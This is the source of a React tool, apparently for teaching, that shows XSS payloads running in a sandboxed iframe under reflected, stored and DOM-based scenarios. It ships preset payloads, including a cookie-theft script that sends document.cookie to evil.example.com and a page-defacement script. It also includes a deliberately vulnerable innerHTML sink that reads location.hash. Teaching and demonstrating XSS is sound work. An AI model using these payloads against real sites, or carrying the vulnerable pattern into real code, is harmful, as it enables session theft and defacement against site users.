"use client";

import { useState } from "react";
import { ToolShell } from "@/components/ui/ToolShell";

type XssType = "reflected" | "stored" | "dom";

const PAYLOADS = [
  {
    label: "Alert probe",
    payload: "<script>alert('XSS')</script>",
    explanation: "Classic <script> tag injection. Works in reflected and stored contexts.",
  },
  {
    label: "Image onerror",
    payload: "<img src=x onerror=\"alert('XSS via img')\">",
    explanation: "Bypasses <script> filters. The broken image triggers the onerror handler.",
  },
  {
    label: "SVG onload",
    payload: "<svg onload=\"alert('XSS via svg')\">",
    explanation: "SVG elements execute onload. Works in contexts that allow SVG tags.",
  },
  {
    label: "Cookie theft",
    payload:
      "<script>new Image().src='https://evil.example.com/log?c='+document.cookie</script>",
    explanation: "Steals the victim's cookies by sending them to an attacker-controlled server.",
  },
  {
    label: "DOM rewrite",
    payload:
      "<script>document.body.innerHTML='<h1 style=color:red>This page has been defaced</h1>'</script>",
    explanation: "Rewrites the entire page content. Could be used for phishing or defacement.",
  },
];

const REFLECTED_HTML = `<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
  <h1>Search Results</h1>
  <p>You searched for: <span id="output"></span></p>
  <p class="footer">Safe content below the injection point.</p>
</body>
</html>`;

const STORED_HTML = `<!DOCTYPE html>
<html>
<head><title>Comments</title></head>
<body>
  <h1>Article Comments</h1>
  <div class="comment">
    <strong>Alice:</strong> Great article! Very informative.
  </div>
  <div class="comment" id="output">
    <strong>You:</strong> {{PAYLOAD}}
  </div>
  <div class="comment">
    <strong>Bob:</strong> Thanks for sharing this.
  </div>
</body>
</html>`;

const DOM_HTML = `<!DOCTYPE html>
<html>
<head><title>Language Selector</title></head>
<body>
  <h1>Welcome</h1>
  <p>Selected language: <span id="output"></span></p>
  <script>
    // Vulnerable: reads from URL hash, writes unsafely
    var lang = location.hash.slice(1);
    document.getElementById('output').innerHTML = lang;
  <\\/script>
</body>
</html>`;

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

export default function DOMXSSVisualizerTool() {
  const [payload, setPayload] = useState("");
  const [activeTab, setActiveTab] = useState<XssType>("reflected");
  const [scenarioLabel, setScenarioLabel] = useState("");

  // Build the HTML to render in the sandboxed iframe
  function buildReflectedHtml(input: string): string {
    return REFLECTED_HTML.replace(
      '<span id="output"></span>',
      `<span id="output">${input}</span>`
    );
  }

  function buildStoredHtml(input: string): string {
    return STORED_HTML.replace("{{PAYLOAD}}", input);
  }

  function buildDomHtml(input: string): string {
    // Simulate: the JS reads the payload and writes it to innerHTML
    const escaped = input.replace(/\\/g, "\\\\").replace(/`/g, "\\`").replace(/\$/g, "\\$");
    return `<!DOCTYPE html>
<html>
<head><title>Language Selector</title></head>
<body>
  <h1>Welcome</h1>
  <p>Selected language: <span id="output"></span></p>
  <p class="footer">Safe content below.</p>
  <script>
    // Simulated DOM-based XSS — payload injected into innerHTML
    var payload = \`${escaped}\`;
    document.getElementById('output').innerHTML = payload;
  <\\/script>
</body>
</html>`;
  }

  function getVisibleHtml(): string {
    if (!payload.trim()) {
      return getEmptyHtml();
    }
    switch (activeTab) {
      case "reflected":
        return buildReflectedHtml(payload);
      case "stored":
        return buildStoredHtml(payload);
      case "dom":
        return buildDomHtml(payload);
    }
  }

  function getEmptyHtml(): string {
    return `<!DOCTYPE html>
<html>
<head><title>Preview</title></head>
<body style="font-family:system-ui,sans-serif;padding:2rem;color:#64748b;">
  <p>Enter a payload above to see how it renders in the ${activeTab} XSS context.</p>
  <p style="font-size:0.875rem">Try one of the preset payloads below.</p>
</body>
</html>`;
  }

  function applyPayload(p: (typeof PAYLOADS)[number]) {
    setPayload(p.payload);
    setScenarioLabel(p.label);
  }

  const tabs: { id: XssType; label: string; desc: string }[] = [
    {
      id: "reflected",
      label: "Reflected",
      desc: "Payload in the URL, echoed immediately by the server.",
    },
    {
      id: "stored",
      label: "Stored",
      desc: "Payload saved on the server, served to every visitor.",
    },
    {
      id: "dom",
      label: "DOM-Based",
      desc: "Payload never reaches the server — injected via client-side JS.",
    },
  ];

  const highlightedPayload = escapeHtml(payload);

  return (
    <ToolShell
      title="XSS Visualizer"
      description="Type an XSS payload and see how it executes in reflected, stored, and DOM-based contexts."
    >
      <div className="space-y-5">
        {/* Input */}
        <div>
          <label className="block text-sm font-medium text-slate-700 mb-1">
            XSS Payload
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={payload}
              onChange={(e) => {
                setPayload(e.target.value);
                setScenarioLabel("");
              }}
              placeholder='e.g. <img src=x onerror=alert(1)>'
              className="flex-1 px-3 py-2 border border-slate-300 rounded-md font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
            />
          </div>
        </div>

        {/* Preset payloads */}
        <div>
          <p className="text-sm font-medium text-slate-600 mb-2">
            Try these payloads:
          </p>
          <div className="flex flex-wrap gap-2">
            {PAYLOADS.map((p) => (
              <button
                key={p.label}
                onClick={() => applyPayload(p)}
                className={`px-3 py-1.5 text-xs rounded-md font-medium transition-colors ${
                  scenarioLabel === p.label
                    ? "bg-slate-800 text-white"
                    : "bg-slate-100 text-slate-600 hover:bg-slate-200"
                }`}
              >
                {p.label}
              </button>
            ))}
          </div>
          {scenarioLabel && (
            <p className="mt-2 text-xs text-slate-500 italic">
              {PAYLOADS.find((p) => p.label === scenarioLabel)?.explanation}
            </p>
          )}
        </div>

        {/* Type tabs */}
        <div>
          <p className="text-sm font-medium text-slate-600 mb-2">
            XSS Type:
          </p>
          <div className="flex gap-1 bg-slate-100 p-1 rounded-lg w-fit">
            {tabs.map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`px-4 py-1.5 text-sm rounded-md font-medium transition-colors ${
                  activeTab === tab.id
                    ? "bg-white text-slate-800 shadow-sm"
                    : "text-slate-500 hover:text-slate-700"
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>
          <p className="mt-1 text-xs text-slate-400">
            {tabs.find((t) => t.id === activeTab)?.desc}
          </p>
        </div>

        {/* Highlighted payload */}
        {payload && (
          <div>
            <p className="text-sm font-medium text-slate-600 mb-1">
              Your payload (HTML-escaped for display):
            </p>
            <pre className="p-3 rounded-md text-xs font-mono bg-red-50 text-red-800 border border-red-200 overflow-x-auto whitespace-pre-wrap">
              {highlightedPayload}
            </pre>
          </div>
        )}

        {/* Rendered preview — sandboxed iframe */}
        <div>
          <p className="text-sm font-medium text-slate-600 mb-1">
            Rendered Output
            <span className="text-slate-400 font-normal ml-1">
              (sandboxed — scripts execute here but cannot affect this page)
            </span>
          </p>
          <div className="border border-slate-300 rounded-lg overflow-hidden bg-white">
            <iframe
              srcDoc={getVisibleHtml()}
              sandbox="allow-scripts"
              title="XSS Output Preview"
              className="w-full h-64 border-0"
            />
          </div>
        </div>

        {/* Explanation */}
        <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-sm text-slate-600">
          <p className="font-medium text-slate-700 mb-2">
            What&apos;s happening?
          </p>
          {activeTab === "reflected" && (
            <p>
              <strong>Reflected XSS:</strong> The payload is in the URL or form
              input. The server echoes it directly into the HTML response. The
              victim must click a crafted link. The payload never touches the
              database — it &quot;reflects&quot; off the server.
            </p>
          )}
          {activeTab === "stored" && (
            <p>
              <strong>Stored XSS:</strong> The payload is saved on the server
              (database, file, cache) and served to <em>every</em> user who
              views the page. This is the most dangerous form — one payload can
              compromise thousands of users. Common in comment sections, user
              profiles, and forums.
            </p>
          )}
          {activeTab === "dom" && (
            <p>
              <strong>DOM-Based XSS:</strong> The payload never reaches the
              server. Client-side JavaScript reads it from the URL (
              <code>location.hash</code>, <code>document.referrer</code>) and
              writes it unsafely to <code>innerHTML</code> or{" "}
              <code>document.write</code>. Server-side scanners cannot detect
              this — you must review client-side code.
            </p>
          )}
        </div>
      </div>
    </ToolShell>
  );
}
